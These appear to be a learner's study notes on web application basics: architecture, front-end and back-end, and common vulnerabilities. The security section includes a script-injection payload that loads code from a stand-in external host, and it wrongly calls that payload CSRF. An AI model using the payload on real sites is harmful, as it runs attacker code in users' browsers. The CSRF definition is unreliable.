# Introduction to web applications
#HTB #academy #web #webapplication

## Introduction 

[[Web Application]] are web 2.0 which is run in the browser using [[HTTP]] / [[HTTPS]], that adopt to the user input, in most cases a web application consists of three parts the front-end which is run on the user browser, back-end that is hosted on a web server and [[Database]] which hold the information. 

The difference between web 1.0 and 2.0 is the fact that 1.0 present static pages, which are only edited by the web master, where 2.0 adopt to the user, e.g. when you login to a portal information that presented is specific to you. 

The big advantages of web application is nothing is required to be installed on the client and when updates is pushed out it affect everyone, no need to thing about version as everyone will be using the same. The big problem with web application is that everyone have access to the site. Leaving it open for attacks. 

[[OWASP]] have a list of recommendation of testing, but also a list of the most common vulnerabilities for web application. 

## Attacks 
| Atttack                  | Description                                                                          |     |
| ------------------------ | ------------------------------------------------------------------------------------ |
| SQL injection            | Sending data through a input field that is connect to a database to get information. |     |
| File inclusion           | Reading files the user is not suppose to such a config files.                        |     |
| Unrestricted file upload | Allowing user to upload file, without validation file type.                          |     |
| Broken access control    | privilege escalate on the web application to get admin right.                        |     |

## Architecture
Web application architecture have three components. Frontend, backend and database 
The frontend is what the user sees and interact with, backend process the input from the frontend. and database storage the information for persistence. The backend and frontend can be on the same server, or it can be mulitple server hosting the backend or database part. depending on the design of the web application. 

| Layer              | Description                      |
| ------------------ | -------------------------------- |
| Presentation layer | What the user sees               |
| Application layer  | the backend logic                |
| Data layer         | Where the information is stored. |


![[Pasted image 20210531145807.png]]

### Microservice
Is a Web application architecture design where the goal is to split up the deference services in to independent services.  Each service is stateless and does not know the state of the other service, which is why a message broker is used to communicate between the services. Where each service have it own database storage. To separate each service. 


### Serverless 
Serverless architecture is provided by the big cloud provider, where developer no longer need to think about the server. The web application is run on [[Container]] / [[Docker]]. 


## Front-end vs Back-end 
Front-end vs Back-end describe the relation between what the browser handles and what the server takes care off. and full stack is everything from front and back. 

### Front-end 
Is everything the browser interact with. [[HTML]], [[CSS]] and [[Javascript]]. these element then get presentment by the web browser. 

#### HTML 
[[HTML]] is the front-end of web application it contains the text and images and form elements. 

#### CSS 
Cascading style sheets is a stylesheet is used together with HTML to format the design of the html elements. 
There exists the framework for optimizing the development of CSS design. Bootstrap, SASS. 


#### Javascript 
[[Javascript]] is code which is executed by the browser. usage of javascript is to handle user input and make AJAX request to web server for resources. but also update the web page in real time. 

### Back-end 
Is everything from the web server, web application and the database. 
common web server include iis, apache. web application also known as development frameworks is the code php, python, .net. And last [[Database]] can be anything form relative database like [[MSSQL]], [[MYSQL]] or no-relative database [[No-SQL]] or [[MongoDB]]. These component can be on the same server or be separated into small containers. 

#### API
Application programmering interface is a way of interacting with the back-end server. It commonly used when the front-end need to make a request to the back-end API are used. But it can also be used by directly to make request to the server, e.g of this is twitter API which allows you to retrieve tweet from users. 
The return data can come in many format, a common one is JSON format. another options is SOAP 

## Security 
Security in web application is often put to the right or not part of the agenda at all because of the speed business require new code to be pushed out. which is why [[OWASP]] have create a top 10 list of the most common vulnerabilities they see. 

### Sensitive data exposure 
All front-end data is sent to the user, in some cases information can be added to the code of the web application which is not suppose to be available . e.g. 
```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```

Here is an example of a developer created a TODO inside the code which any visiting the site can view. 

### HTML Injection / Cross-site scripting
[[Cross site scripting]]
When input field are not sanitizes allows a hacker to inject HTML or javascript code into the website. it the same vulnerability of not validating user input.  
 
Cross-site request forgery (CSRF) is in the same category as the two above, but instead of injecting javascript directly, Cross-site will instead reference javascript that located on a other server. e.g.

```html
"><script src=//www.example.com/exploit.js></script>
```
Here the browser will load the exploit.js code and execute it. 


### Broken authentication/Access control 
Happens when bad authentication is implemented, either allowing the hacker to bypass the login entirely or privilege escalate from user to admin. 

### Malicious File upload 
Is when file upload to the webserver is not validated, allows us to upload script to the webserver which will execute server-side code on the machine. 

### Command injection 
Some web application execute OS commands to perform processes, if the input is not properly filtered this could lead to command injection and allow a hacker to execute their own code on the web server. 


### SQLI 
[[SQL injection]] is very similar to command injection but instead for execute the code directly on the OS, it execute inside the database which also could lead to OS execution, with [[MSSQL]] xp_cmdshell

## Public CVE 
[[CVE]] are vulnabilities that is publicly disclosed, the first step is to identify the version of the application and then search for public exploit  like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/).

### CVSS
Is a public way for scoring vulnerabilities. 